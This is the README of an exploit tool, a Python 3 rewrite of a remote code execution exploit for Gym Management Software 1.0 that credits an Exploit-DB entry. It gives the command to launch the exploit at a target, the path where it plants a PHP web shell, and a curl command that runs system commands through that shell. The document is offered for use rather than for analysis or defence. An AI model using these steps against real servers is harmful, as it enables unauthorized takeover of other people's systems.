# Gym-Management-Software-1.0-RCE
This is a Python 3 rewrite of the original exploit targeting Gym Management Software version 1.0.

### Requirements
- Python 3
- `requests` module

Install it using:
```bash
pip install requests
```

### Usage

```bash
python3 exploit.py https://<target-ip>:8080/
```

If successful, a web shell will be uploaded to `https://<target-ip>:8080/upload/85c7e2c0-d9c7-40e1-a214-678558affffb.php`

To run a command on the target system using the uploaded shell: `curl https://<target-ip>:8080/upload/85c7e2c0-d9c7-40e1-a214-678558affffb.php -H "cmd: whoami"`

### Credits

This script is based on the original exploit published on Exploit-DB:
- https://www.exploit-db.com/exploits/48506
